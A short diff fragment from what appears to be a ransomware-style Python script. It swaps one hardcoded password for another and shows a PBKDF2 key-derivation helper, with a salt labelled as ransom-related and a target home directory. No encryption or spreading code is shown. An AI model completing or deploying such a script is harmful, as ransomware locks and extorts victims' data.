@@ -5,7 +5,7 @@ from Crypto.Util.Padding import pad, unpad
 
 TARGET_DIR = "/home/osint"
 SALT = b'rans0m_salt_!@#$'  
-PASSWORD = "Abhishek!234@#$"  
+PASSWORD = "you_cant_find_it_madd"  
 
 def derive_key(password):
     return PBKDF2(password.encode(), SALT, dkLen=32, count=100000)
